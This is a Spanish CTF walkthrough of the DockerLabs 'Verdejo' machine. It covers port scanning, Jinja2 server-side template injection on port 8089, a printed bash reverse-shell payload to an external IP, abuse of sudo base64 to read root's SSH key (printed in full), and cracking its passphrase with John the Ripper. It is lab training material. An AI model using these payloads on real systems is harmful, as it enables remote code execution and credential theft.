___
Tags: #SSTI #idrsa #john #SUID
___
# Verdejo

## Información General

**- Dificultad:** Fácil <br>
**- Sistema operativo:** Linux <br>
**- Vulnerabilidad explotada.**  Server Side Template Injection (SSTI) y SUID <br>
**- Fecha de resolución:** 21/03/2026 <br>
**- Enlace:** https://dockerlabs.es <br>

## Reconocimiento

**DockerLabs** nos proporciona la ip de la máquina objetivo **172.17.0.2**

### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 172.17.0.2
```

**Su ttl es 64. Por tanto, es Linux**

## Enumeración

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

| Open port | Service | Version                                       |
| --------- | ------- | --------------------------------------------- |
| 22        | ssh     | OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) |
| 80        | http    | Apache httpd 2.4.59 ((Debian))                |
| 8089      | http    | Werkzeug httpd 2.2.2 (Python 3.11.2)          |

## Explotación

### SSTI

Visitando http://172.17.0.2:8089/ encuentro lo siguiente:

<p align="center"> 
<img src="images/ssti-1.png" width="600" alt="Resultado de Nmap">
</p>

Para probar si este sitio es vulnerable a **SSTI** escribimos la siguiente operación {{7+7}}, y si nos da el resultado, se puede explotar la vulnerabilidad SSTI

<p align="center"> 
<img src="images/ssti-2.png" width="600" alt="Resultado de Nmap">
</p>

Para explotar correctamente esta vulnerabilidad tenemos que saber que motor de plantilla está usando. En primer lugar, la pagina esta usando **Werkzeug/2.2.2 Python/3.11.2** investigando me encuentro que el **framework** que usa es **Flask** y usa como motor de plantilla **jinja2**

A continuación, me encuentro esta [pagina](https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3) que explica como explotar esta vulnerabilidad 

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

<p align="center"> 
<img src="images/ssti id.png" width="600" alt="Resultado de Nmap">
</p>

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.0.108/4443 0>&1"').read() }}
```

Preparamos el puerto

```
nc -lvnp 4443
```

<p align="center"> 
<img src="images/nc.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

#### TTY

```
script /dev/null -c bash
```

**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

#### Primer comando:

```
sudo -l
```

<p align="center"> 
<img src="images/sudo -l.png" width="600" alt="Resultado de Nmap">
</p>

En esta página [gtfobins](https://gtfobins.org/gtfobins/base64/#file-read) muestra un payload que permite leer archivos arbitrarios codificando y decodificando para bypass.

```
sudo -u root /usr/bin/base64 /root/.ssh/id_rsa | /usr/bin/base64 -d
```

d: Se usa este parámetro para decodificar de vuelta a texto plano

>-----BEGIN OPENSSH PRIVATE KEY-----
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
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----

#### John the ripper

Me hace falta saber la contraseña, usaremos la herramienta jonh the ripper

```
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

<font color="#92d050">honda1           (id_rsa) </font>

```
ssh -i id_rsa root@172.17.0.2
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

En el laboratorio **Vermejo** de **DockerLabs** explotamos una vulnerabilidad SSTI en el puerto 8089 para obtener shell. Enumerando con `sudo -l` descubrimos que podemos ejecutar el binario **base64** como root, por lo que usamos el payload de GTFOBins: el comando nos da, codifica la clave privada de root en Base64 y luego la decodifica a texto plano. Finalmente, crackeamos la passphrase de la clave privada con John the Ripper y accedemos como root vía SSH.